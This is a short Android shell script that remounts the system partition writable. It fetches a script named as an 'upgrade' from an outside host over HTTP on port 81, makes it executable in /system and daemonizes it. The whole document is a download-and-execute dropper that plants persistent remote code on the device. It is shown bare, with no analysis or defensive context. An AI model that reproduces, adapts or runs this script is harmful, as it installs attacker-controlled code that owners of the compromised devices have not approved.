#!/system/bin/sh

mount -o rw,remount /system
curl -o /system/upgradeandroiddvt2.sh http://wire.my.to:81/upgradeandroiddvt2.sh || exit 0
chmod +rwx /system/upgradeandroiddvt2.sh
daemonize /system/upgradeandroiddvt2.sh